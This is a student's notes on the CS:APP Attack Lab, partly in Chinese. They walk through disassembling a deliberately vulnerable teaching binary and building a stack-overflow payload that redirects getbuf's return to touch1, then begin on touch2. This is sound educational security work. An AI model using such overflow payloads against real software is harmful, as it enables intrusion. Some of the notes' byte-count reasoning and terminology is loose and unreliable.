## Prenote
https://github.com/kechenkristin/csapp/blob/main/labs/attacklab/%E8%AE%B2%E4%B9%89.pdf

### Files
```shell
kristin@kristin-PC:~/study/csapp/labs/attacklab/target1$ ls
cookie.txt  ctarget  farm.c  hex2raw  README.txt  rtarget
```

- README.txt: A file describing the contents of the directory
- ctarget: An executable program vulnerable to code-injection attacks
- rtarget: An executable program vulnerable to return-oriented-programming attacks
- cookie.txt: An 8-digit hex code that you will use as a unique identifier in your attacks.
- farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented programming attacks.
- hex2raw: A utility to generate attack strings.

### getbuf()
Both CTARGET and RTARGET read strings from standard input. They do so with the function getbuf defined below:
```c
unsigned getbuf() {
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

### 过程调用的栈帧结构
![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p4.png)

## Level1
### instruction
- tips from pdf  
• All the information you need to devise your exploit string for this level can be determined by exam-ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.  
• The idea is to position a byte representation of the starting address for touch1 so that the ret instruction at the end of the code for getbuf will transfer control to touch1.  
• Be careful about byte ordering.  
• You might want to use GDB to step the program through the last few instructions of getbuf to make sure it is doing the right thing.  
• The placement of buf within the stack frame for getbuf depends on the value of compile-time constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the disassembled code to determine its position.  

- 实验步骤
1. 反汇编二进制目标程序bufbomb，获得其汇编
指令代码
2. 从汇编指令中分析获得getbuf函数执行时的栈
帧结构，定位buf数组缓冲区在栈帧中的位置
3. 根据栈帧中需要改变的目标信息及其与缓冲区
的相对位置，设计攻击字符串

### codes
#### touch1
```c
void touch1() {
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
```

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```
The return address of touch1 is **4017c0**


#### test
```c
void test() {
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```asm
(gdb) disas test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx	// test调用完getbuf后正常的返回地址应该是0x0000000000401976
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	ret    
End of assembler dump.
```

```
(gdb) p (char*)0x403188  
$3 = 0x403188 "No exploit.  Getbuf returned 0x%x\n"  
```

#### getbuf
```c
unsigned getbuf() {
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

```asm
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi	// Gets函数调用指令之前的一条指令的地址
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax	// Gets函数指令之后的下一条指令的地址
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret    
End of assembler dump.
```

![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p3.png)


### getbuf的栈帧结构
> sub    $0x28,%rsp  
> add    $0x28,%rsp  
十六进制的0x28也就是十进制的40Byte  
![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p1.jpg)

### 设计攻击字符串(注意要小端方式)
![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p2.png)

对于字节怎么在计算机里表示我不知道， 但是看向objdump的反汇编文件
> 00000000004017c0 <touch1>:  
一个地址等于八个字节，我们需要40 + 4 + 4 (touch地址）的攻击字符串

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

## touch2
```asm
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	call   0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	call   0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>
End of assembler dump.
```
